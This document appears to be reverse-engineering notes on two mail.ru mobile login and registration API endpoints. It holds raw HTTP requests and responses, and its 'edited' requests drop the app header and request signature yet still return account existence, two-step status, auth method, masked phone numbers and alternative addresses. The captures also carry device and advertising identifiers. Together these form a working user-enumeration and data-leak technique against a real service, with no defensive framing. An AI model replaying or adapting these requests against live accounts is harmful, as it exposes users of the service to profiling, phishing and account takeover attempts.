## API info for login:
## API 1 AT https://alt-auth.mail.ru from sign in
`ORIGINAL`:
"
POST /api/v1/pushauth/info?mmp=mail&mp=android HTTP/2
Host: alt-auth.mail.ru
X-Mobile-App: e552fda2e6c711eaadc10242ac120002
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
Accept-Encoding: gzip, deflate, br
User-Agent: okhttp/4.12.0

sat=false&login=mohamedfdfdfffd%40mail.ru&md5_post_signature=97dc50fb4826dabc1cffd9c1cce5f62d
"
`RESPONSE`
"
{"status":200,"htmlencoded":true,"email":"mohamedd@mail.ru","body":{"exists":true,"twostep":false,"can_push":false,"alt_email":false,"phone":true,"trusted":false,"available":true,"has_vkc":false,"has_esia":false,"auth":"password","provider":"default","webauthn":[],"phones":[{"id":"0","masked":"+491781XX****"},{"id":"1","masked":"+995593XX****"}],"alt_emails":[],"vkid_auth":{"redirect_url":"https://auth.mail.ru/api/v1/pushauth/vkid/start/mobile?email=mohamedd%40mail.ru"},"can_force_password":false,"twostep_preserve":false}}
"
`EDITED REQUEST`
"
POST /api/v1/pushauth/info?mmp=mail&mp=android HTTP/2
Host: alt-auth.mail.ru
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Accept-Encoding: gzip, deflate, br
User-Agent: okhttp/4.12.0

sat=false&login=mohamedasasas@mail.ru
"
`RESPONSE`
"
{"status":200,"htmlencoded":true,"email":"mohamedasasas@mail.ru","body":{"exists":false,"twostep":false,"can_push":false,"alt_email":false,"phone":false,"trusted":false,"available":false,"has_vkc":false,"has_esia":false,"auth":"","provider":"default","webauthn":[],"phones":[],"alt_emails":[],"can_force_password":false,"twostep_preserve":false}}
"
## API 2 AT https://alt-aj-https.mail.ru from register
`ORIGINAL`:
"
POST /api/v1/user/exists?act_mode=inact&mp=android&mmp=mail&ver=ru.mail.mailapp15.70.0.130771 HTTP/2
Host: alt-aj-https.mail.ru
X-Mobile-App: e552fda2e6c711eaadc10242ac120002
User-Agent: mobmail android 15.70.0.130771 ru.mail.mailapp
X-Hitman-Data-Req: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 678
Accept-Encoding: gzip, deflate, br

email=mohamedd%40mail.ru&birthday=%7B%22day%22%3A23%2C%22month%22%3A%221%22%2C%22year%22%3A1994%7D&name=%7B%22first%22%3A%22Dvgsdt%22%2C%22last%22%3A%22Gfvdghdfbh%22%7D&DeviceID=40b230caea2a0bbf5fbc9733d47bf397&client=mobile&udid=f57ccfe94333bc97513ecc0f8250db98c396a3340f18c3ff16034560973328ef&playservices=201817023&connectid=17c292cb2f6327498c1bab413a07001b&os=Android&os_version=11&appbuild=130771&vendor=Google&model=sdk_gphone_x86_64&device_type=Smartphone&country=US&language=en_US&timezone=GMT%2B03%3A00&device_name=Google%20sdk_gphone_x86_64&instanceid=erC03GQmSHqfEa_7_LCXJc&idfa=e5b8e54e-29ce-4b6b-af69-a0d5973f0429&md5_post_signature=c07fcb23e3831de62c85fec0fb22ef8f
"
`RESPONSE`
"
{"status":200,"htmlencoded":true,"email":"mohamedd@mail.ru","body":{"exists":true,"alternatives":["mohamedd@internet.ru","dvgsdt@mail.ru","gfvdghdfbh@mail.ru","dgfvdghdfbh@mail.ru","dvgsdt.gfvdghdfbh@mail.ru","mohamedd2027@mail.ru","gfvdghdfbh94@mail.ru","gdvgsdt@mail.ru"]}}
"
`EDITED REQUEST`
"
POST /api/v1/user/exists?act_mode=inact&mp=android&mmp=mail&ver=ru.mail.mailapp15.70.0.130771 HTTP/2
Host: alt-aj-https.mail.ru
User-Agent: mobmail android 15.70.0.130771 ru.mail.mailapp
X-Hitman-Data-Req: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 678
Accept-Encoding: gzip, deflate, br

email=mohamedddddddddd@mail.ru
"
`RESPONSE`
"
{"status":200,"htmlencoded":true,"email":"mohamedddddddddd@mail.ru","body":{"exists":false,"alternatives":["mohamedddddddddd@bk.ru","mohamedddddddddd00@mail.ru","mohamedddddddddd@inbox.ru","mohamedddddddddd2026@mail.ru","mohamedddddddddd@list.ru","mohamedddddddddd2027@mail.ru","mohamedddddddddd@internet.ru","mohamedddddddddd.00@mail.ru"]}}
"